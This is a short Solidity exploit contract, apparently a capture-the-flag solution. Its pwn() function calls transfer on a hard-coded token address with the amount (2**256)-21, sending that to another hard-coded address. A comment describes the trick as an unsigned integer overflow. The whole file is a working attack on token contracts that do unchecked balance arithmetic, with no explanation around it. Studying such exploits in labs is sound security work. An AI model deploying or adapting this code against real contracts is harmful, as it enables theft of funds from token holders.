pragma solidity ^0.8;

interface Token {
	function transfer(address _to, uint _value) external returns (bool);
}

contract expl {
	Token public token = Token(0x41a1e273b1D60952a4c293b622409B59620f5F48);

	function pwn() public {
		token.transfer(0x6256E0e4b47f07d277D4e5dEDc394736252831DE, (2**256) - 21); // simple unsigned integer overflow
	}
}
